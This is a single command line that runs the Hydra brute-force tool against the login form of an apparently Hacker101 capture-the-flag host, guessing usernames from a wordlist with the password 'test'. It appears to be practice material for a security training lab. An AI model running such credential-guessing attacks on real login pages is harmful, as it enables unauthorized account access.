hydra -t 64 -L /usr/share/wordlists/usernames.txt -p test d13572da69b34e875361ff1be3c70f43.ctf.hacker101.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid username"
